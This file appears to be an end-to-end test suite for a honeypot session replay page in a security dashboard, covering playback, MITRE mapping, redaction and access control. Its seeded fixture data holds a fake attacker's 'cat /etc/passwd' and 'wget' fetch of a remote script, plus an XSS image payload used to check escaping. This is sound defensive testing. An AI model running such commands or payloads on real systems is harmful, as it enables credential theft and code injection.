import { createRequire } from 'module';
import { test, expect } from './fixtures/auth.fixture.js';
import { validateTestDatabaseName } from './dbGuard.js';

// Attack Time Machine against the real route, the real test backend and the isolated test database. This spec seeds
// its own records (documentation-range IPs, "atm-e2e-" ids) and removes exactly those records afterwards.
const require = createRequire(import.meta.url);
const mongoose = require('../../backend/node_modules/mongoose');
const ThreatLog = require('../../backend/models/ThreatLog');
const HoneypotSession = require('../../backend/models/HoneypotSession');
const Alert = require('../../backend/models/Alert');
const ContainmentAction = require('../../backend/models/ContainmentAction');

const MONGO_URI = process.env.MONGO_URI || 'mongodb://localhost:27017/sentinelai_test';
const t = (s) => new Date(Date.UTC(2026, 9, 20, 5, 0, s));
const seeded = {};

test.describe.configure({ mode: 'serial' });

test.beforeAll(async () => {
  validateTestDatabaseName(MONGO_URI);
  if (mongoose.connection.readyState === 0) await mongoose.connect(MONGO_URI, { serverSelectionTimeoutMS: 5000 });
  const threat = await ThreatLog.create({
    sourceIP: '198.51.100.23', severity: 'HIGH', attackType: 'SSH Intrusion Attempt', aiScore: 0.86, status: 'MONITORING',
    notes: 'atm-e2e seeded threat', createdAt: t(40),
  });
  const session = await HoneypotSession.create({
    sessionId: 'atm-e2e-201', sourceIP: '198.51.100.23', sourcePort: 50122, status: 'closed',
    startTime: t(1), endTime: t(35), durationSeconds: 34, servedProfile: 'ubuntu_22', deceptionScore: 19,
    credentials: [{ username: 'admin', password: '***REDACTED***', success: false }, { username: 'root', password: '***REDACTED***', success: true }],
    commands: [
      { command: 'whoami', timestamp: t(12), success: true },
      { command: 'cat /etc/passwd', timestamp: t(17), success: true, output: '<img src=x onerror=alert(1)>root:x:0:0' },
      { command: 'wget http://198.51.100.99/x.sh', timestamp: t(24), success: false },
    ],
    linkedThreatLog: threat._id, aiClassification: 'SSH Intrusion Attempt', aiThreatScore: 0.86,
    aiClassificationMethod: 'honeypot_rules', closureAnalysisState: 'complete', closureAnalysisCompletedAt: t(36),
  });
  const single = await HoneypotSession.create({ sessionId: 'atm-e2e-202', sourceIP: '198.51.100.24', status: 'active', startTime: t(50) });
  const alert = await Alert.create({
    title: 'atm-e2e session alert', message: 'Honeypot session from 198.51.100.23', severity: 'MEDIUM', type: 'HONEYPOT_SESSION',
    sourceRef: { refModel: 'HoneypotSession', refId: session._id }, createdAt: t(2),
  });
  const action = await ContainmentAction.create({
    target: '198.51.100.23', normalizedTarget: '198.51.100.23', enforcementBackend: 'mock', enforcementStatus: 'ROLLED_BACK',
    policyDecision: 'ALLOWED', targetMetadata: { originalThreatId: threat._id, severity: 'HIGH' },
    requestedAt: t(41), appliedAt: t(42), rolledBackAt: t(45),
  });
  Object.assign(seeded, { threat: threat._id, session: session._id, single: single._id, alert: alert._id, action: action._id });
});

test.afterAll(async () => {
  await Promise.all([
    HoneypotSession.deleteMany({ _id: { $in: [seeded.session, seeded.single].filter(Boolean) } }),
    ThreatLog.deleteOne({ _id: seeded.threat }),
    Alert.deleteOne({ _id: seeded.alert }),
    ContainmentAction.deleteOne({ _id: seeded.action }),
  ]);
  await mongoose.disconnect();
});

const openSeededSession = async (page) => {
  await page.getByTestId('atm-search').fill('atm-e2e-201');
  await page.getByRole('button', { name: 'Search' }).click();
  await expect(page.getByTestId('atm-session-row')).toHaveCount(1);
  await page.getByRole('button', { name: 'Replay session atm-e2e-201' }).click();
  await expect(page.getByTestId('atm-replay')).toBeVisible();
};

test('analyst replays a recorded session end to end', async ({ page, loginAs }) => {
  const writes = [];
  page.on('request', (r) => { if (r.url().includes('/api/') && !['GET', 'OPTIONS'].includes(r.method()) && !/\/api\/auth\//.test(r.url())) writes.push(`${r.method()} ${r.url()}`); });
  await loginAs('analyst');

  // Navigation entry
  await page.locator('.sentinel-sidebar').getByRole('link', { name: /Attack Time Machine/i }).click();
  await expect(page).toHaveURL(/\/dashboard\/attack-time-machine$/);
  await expect(page.getByRole('heading', { name: /Attack Time Machine/i })).toBeVisible();

  await openSeededSession(page);
  await expect(page).toHaveURL(/session=[a-f0-9]{24}/);
  await expect(page.getByTestId('atm-session-id')).toHaveText('atm-e2e-201');
  await expect(page.getByTestId('atm-kpi-commands')).toContainText('3');
  await expect(page.getByTestId('atm-kpi-duration')).toContainText('34s');
  // whoami, /etc/passwd and wget map to three techniques; the threat record's own techniques are not counted
  await expect(page.getByTestId('atm-kpi-mitre')).toContainText('3');
  await expect(page.getByTestId('atm-narrative')).toHaveText(/lasted 34s and contained 3 recorded commands/);

  // Real stored events in chronological order, with provenance labels
  const events = page.getByTestId('atm-event');
  await expect(events.first()).toContainText('SSH connection opened');
  const titles = await events.allInnerTexts();
  const order = ['connection opened', 'Alert: atm-e2e session alert', 'whoami', 'cat /etc/passwd', 'wget', 'Session closed', 'Session classified', 'Threat record', 'Containment requested', 'Containment applied', 'Containment rolled back'];
  const positions = order.map((s) => titles.findIndex((x) => x.includes(s)));
  expect(positions.every((p) => p >= 0)).toBe(true);
  expect([...positions].sort((a, b) => a - b)).toEqual(positions);
  await expect(page.locator('[data-testid="atm-timeline"] [data-provenance="OBSERVED"]').first()).toBeVisible();
  await expect(page.locator('[data-testid="atm-timeline"] [data-provenance="DERIVED"]').first()).toBeVisible();
  await expect(page.locator('[data-testid="atm-timeline"] [data-provenance="SIMULATED"]').first()).toBeVisible();
  // Login attempts have no per-attempt time: listed under Unknown time, outcomes as recorded
  await expect(page.getByTestId('atm-untimed')).toContainText('Login attempt failed');
  await expect(page.getByTestId('atm-untimed')).toContainText('Login attempt succeeded');

  // Playback: play advances, pause stops
  const position = page.getByTestId('atm-position');
  await expect(position).toContainText(`EVENT 1 / ${titles.length}`);
  await page.getByTestId('atm-speed-4').click();
  await expect(page.getByTestId('atm-speed-4')).toHaveAttribute('aria-pressed', 'true');
  await page.getByTestId('atm-play').click();
  await expect(position).not.toContainText('EVENT 1 /', { timeout: 5000 });
  await page.getByTestId('atm-play').click(); // pause
  await expect(page.getByTestId('atm-play')).toHaveAccessibleName('Play recorded timeline');
  const paused = await position.innerText();
  await page.waitForTimeout(1200);
  await expect(position).toHaveText(paused);

  // Previous / next / seek / restart
  await page.getByRole('button', { name: 'Restart from the first event' }).click();
  await expect(position).toContainText('EVENT 1 /');
  await page.getByRole('button', { name: 'Next event' }).click();
  await expect(position).toContainText('EVENT 2 /');
  await page.getByRole('button', { name: 'Previous event' }).click();
  await expect(position).toContainText('EVENT 1 /');
  const cmdIndex = titles.findIndex((x) => x.includes('cat /etc/passwd'));
  await page.getByTestId('atm-seek').fill(String(cmdIndex));
  await expect(position).toContainText(`EVENT ${cmdIndex + 1} /`);

  // Event details show the stored command and its untrusted output as inert text
  const details = page.getByTestId('atm-event-details');
  await expect(details.getByTestId('atm-detail-command')).toHaveText('cat /etc/passwd');
  await expect(details).toContainText('<img src=x onerror=alert(1)>root:x:0:0');
  await expect(details.locator('img')).toHaveCount(0);
  await expect(details).toContainText('T1003.008');

  // MITRE panel: selecting a technique jumps to the event it was derived from
  await events.nth(0).click();
  await page.getByTestId('atm-mitre').getByRole('button', { name: /T1033/ }).click();
  await expect(details.getByTestId('atm-detail-command')).toHaveText('whoami');

  // Mock containment is labelled as such, never as a host firewall block
  await events.filter({ hasText: 'Containment applied' }).click();
  await expect(details).toContainText('Mock firewall adapter (no host rule applied)');

  // Back to the list keeps the search; browser back returns to the replay
  await page.getByTestId('atm-back').click();
  await expect(page.getByTestId('atm-search')).toHaveValue('atm-e2e-201');
  await expect(page.getByTestId('atm-session-row')).toHaveCount(1);
  await page.goBack();
  await expect(page.getByTestId('atm-session-id')).toHaveText('atm-e2e-201');
  await page.reload();
  await expect(page.getByTestId('atm-session-id')).toHaveText('atm-e2e-201');

  expect(writes).toEqual([]);
  await page.screenshot({ path: 'test-results/attack-time-machine.png', fullPage: true });
});

test('single-event session and empty search result are handled honestly', async ({ page, loginAs }) => {
  await loginAs('analyst');
  await page.goto(`/dashboard/attack-time-machine?session=${seeded.single}`);
  await expect(page.getByTestId('atm-live')).toBeVisible();
  await expect(page.getByTestId('atm-position')).toContainText('EVENT 1 / 1');
  await page.getByTestId('atm-play').click();
  await expect(page.getByTestId('atm-play')).toHaveAccessibleName('Play recorded timeline');
  await expect(page.getByTestId('atm-no-mitre')).toBeVisible();
  await expect(page.getByTestId('atm-no-response')).toBeVisible();

  await page.goto('/dashboard/attack-time-machine?q=atm-e2e-does-not-exist');
  await expect(page.getByTestId('atm-empty')).toContainText('No recorded honeypot session matches these filters.');
});

test('empty state when no session is recorded', async ({ page, loginAs }) => {
  await page.route(/\/api\/honeypot\/sessions(\?|$)/, (route) =>
    route.fulfill({ status: 200, json: { success: true, data: [], pagination: { total: 0, page: 1, limit: 10, pages: 0 } } }));
  await loginAs('analyst');
  await page.goto('/dashboard/attack-time-machine');
  await expect(page.getByTestId('atm-empty')).toContainText('has not recorded any attack session yet');
});

test('viewer sees redacted evidence and no containment records', async ({ page, loginAs }) => {
  await loginAs('viewer');
  await expect(page.locator('.sentinel-sidebar').getByRole('link', { name: /Attack Time Machine/i })).toBeVisible();
  const timeline = page.waitForResponse((r) => r.url().includes(`/api/honeypot/sessions/${seeded.session}/timeline`));
  await page.goto(`/dashboard/attack-time-machine?session=${seeded.session}`);
  const api = await timeline;
  await expect(page.getByTestId('atm-replay')).toBeVisible();
  await expect(page.getByTestId('atm-timeline')).toContainText('[REDACTED_COMMAND]');
  await expect(page.getByTestId('atm-timeline')).not.toContainText('cat /etc/passwd');
  await expect(page.getByText('Containment records are available to admin and analyst roles only.')).toBeVisible();
  await expect(page.locator('[data-testid="atm-timeline"] [data-provenance="SIMULATED"]')).toHaveCount(0);
  expect(api.status()).toBe(200);
  const body = await api.json();
  expect(body.data.containment).toEqual([]);
  expect(body.data.session.sourceIP).toBe('198.51.100.xxx');
});

test('unauthenticated access is redirected and the API refuses', async ({ page, request }) => {
  await page.goto(`/dashboard/attack-time-machine?session=${seeded.session}`);
  await expect(page).toHaveURL(/\/login/);
  const res = await request.get(`http://127.0.0.1:5000/api/honeypot/sessions/${seeded.session}/timeline`);
  expect(res.status()).toBe(401);
});

test('replay layout fits a phone-width viewport without page-level horizontal scroll', async ({ page, loginAs }) => {
  await page.setViewportSize({ width: 375, height: 812 });
  await loginAs('analyst');
  for (const url of ['/dashboard/attack-time-machine?q=atm-e2e', `/dashboard/attack-time-machine?session=${seeded.session}`]) {
    await page.goto(url);
    await expect(page.getByRole('heading', { name: /Attack Time Machine/i })).toBeVisible();
    await expect(page.getByTestId(url.includes('session=') ? 'atm-replay' : 'atm-session-table')).toBeVisible();
    const overflow = await page.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
    expect(overflow).toBeLessThanOrEqual(0);
  }
});
